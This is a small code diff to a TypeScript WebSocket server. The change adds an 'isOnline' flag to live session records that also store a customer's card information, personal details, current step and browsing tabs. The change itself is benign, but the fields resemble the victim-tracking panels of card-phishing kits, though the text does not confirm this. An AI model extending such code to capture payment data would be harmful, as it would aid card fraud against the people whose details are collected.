@@ -122,7 +122,7 @@ export function setupWebSocket(server: any) {
             id: counterId, sessionId: sessionCounter, customerId: cid,
             frontendUrl: payload.frontendUrl, status: 'live', currentStep: payload.currentStep,
             cardInfo: payload.cardInfo, customerInfo: payload.customerInfo,
-            browsingTabs: payload.browsingTabs
+            browsingTabs: payload.browsingTabs, isOnline: true
           });
 
           sessions.set(counterId, {
